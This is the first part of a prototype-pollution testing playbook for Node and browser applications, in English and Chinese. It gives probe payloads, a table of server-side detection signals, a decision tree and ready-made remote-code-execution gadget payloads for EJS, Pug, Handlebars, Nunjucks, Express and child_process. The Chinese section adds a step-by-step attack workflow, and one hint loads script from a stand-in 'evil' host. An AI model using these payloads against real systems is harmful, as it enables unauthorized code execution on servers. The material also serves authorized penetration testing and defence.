# prototype-pollution-test · part 1

> 分段 1/3。完整索引见 `prototype-pollution-test.md`。

## 0. QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.

```text
#__proto__[xxx]=alert(1)
```

### Server-side first probes（JSON / form）

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see §3 detection table).

### Quick boolean

If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**.

---
## 1. MECHANISM

**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.

**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.

**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:

```json
{"constructor":{"prototype":{"polluted":1}}}
```

This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.

**Core issue**: this is not just "one extra parameter"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets.

---
## 2. CLIENT-SIDE DETECTION

### URL fragment

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

If router or analytics code parses fragments into objects and then merges, pollution may occur.

### `constructor.prototype` path

```text
#constructor[prototype][role]=admin
```

### DOM / attribute injection ideas

If the framework merges attribute names as object keys:

```text
__proto__[src]=//evil/xss.js
```

Event-handler style keys (implementation-dependent):

```text
__proto__[onerror]=alert(1)
```

**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference.

---
## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.

| Payload (JSON example) | Expected observable signal |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests is ignored or abnormal (`qs`-style `parameterLimit`) |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | Double-question-mark prefixes like `??foo=bar` are accepted or behavior changes sharply |
| `{"__proto__":{"allowDots":true}}` | Nested keys like `?foo.bar=baz` are expanded via dot notation |
| `{"__proto__":{"json spaces":" "}}` | JSON-serialized responses gain extra spaces (`JSON.stringify` spacing setting polluted) |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers (if framework reads config from prototype) |
| `{"__proto__":{"status":510}}` | Some response status changes to 510 or another abnormal code (app reads `status` from object) |

**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible.

---
## 4. EXPLOITATION GADGETS

| Target / scenario | Payload or pattern | Notes |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | If template engine options like `escapeFunction` are read from polluted prototype, this may lead to RCE; strongly version/config dependent |
| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historical chain: prototype pollution + timeline expression execution; useful to understand **expression + PP** combinations |
| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` option objects) | Depends on whether later code calls `spawn`/`fork` and reads options from prototype chain |
| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that filters only the `__proto__` key |

**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.

---
## 5. TOOLS

| Project | Purpose |
|------|------|
| **yeswehack/pp-finder** | Helps locate PP-prone merge points and patterns |
| **yuske/silent-spring** | Research and detection around prototype-pollution surfaces |
| **yuske/server-side-prototype-pollution** | Server-side PP testing suite/methodology |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension / supporting material |
| **msrkp/PPScan** | Scanning/verification helper |

Prioritize use on **authorized** targets; automated tools can cause side effects on stateful applications.

---
## 6. DECISION TREE

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```

---


# 来源专题：prototype-pollution-advanced

# Prototype Pollution Advanced — RCE & Gadget Exploitation

### PP 打到模板 RCE（战法索引有指针）

认：Node / Express；JSON 或 query 能把 `__proto__` / `constructor.prototype` 写进去（先用 `{"__proto__":{"pptest123":"1"}}`，干净请求还看得到副作用）；后面有 `res.render`、EJS、Pug、Handlebars，或会 `child_process.spawn`。

打：

1. 污染通了再打 gadget，不要一上来喷 RCE 串。
2. EJS：`outputFunctionName` 注入；Pug：`block.type` + `val`；拦 `__proto__` 就换 `constructor.prototype`。
3. 没有模板再试 `shell` + `NODE_OPTIONS`。命令用 `echo 标记 && id`，不要反弹。

算成：下一次模板渲染或 spawn 后，回包/日志出现指定标记或 `uid=`。只污染成功、命令没跑 → 还没成。

假点：只能改前端展示；没有模板/spawn gadget；污染一请求就没了、下一次 render 不跟。单站没中不删战法索引这行。Node 深合并优先开 gadget；别的栈合得进也可以探，对不上丢掉。

gadget 表和 payload 见下面英文段 + 附件 KNOWN_GADGETS。
## 1. SERVER-SIDE PP → RCE

### 1.1 Node.js child_process.spawn — Shell/ENV Injection

When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:

```javascript
// Vulnerable pattern (very common):
const { execSync } = require('child_process');
execSync('ls');  // inherits shell, env from prototype

// Pollution for RCE:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
// Next child_process call executes attacker code
```

Alternative ENV pollution:

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

### 1.2 EJS (Embedded JavaScript Templates)

EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:

```json
// Pollution payload:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// When EJS renders ANY template after pollution:
// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
// → RCE
```

Detection: any EJS `res.render()` call after pollution triggers it.

### 1.3 Pug (formerly Jade)

Pug's compiler reads `block` from object properties:

```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

Alternative via `self` option:

```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars

Handlebars template compilation checks `type` and `program` on template AST nodes:

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

Simpler via `allowProtoMethodsByDefault`:

```json
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
// Then use {{#with this as |obj|}}{{obj.constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### 1.5 Nunjucks

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render (Generic)

When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---
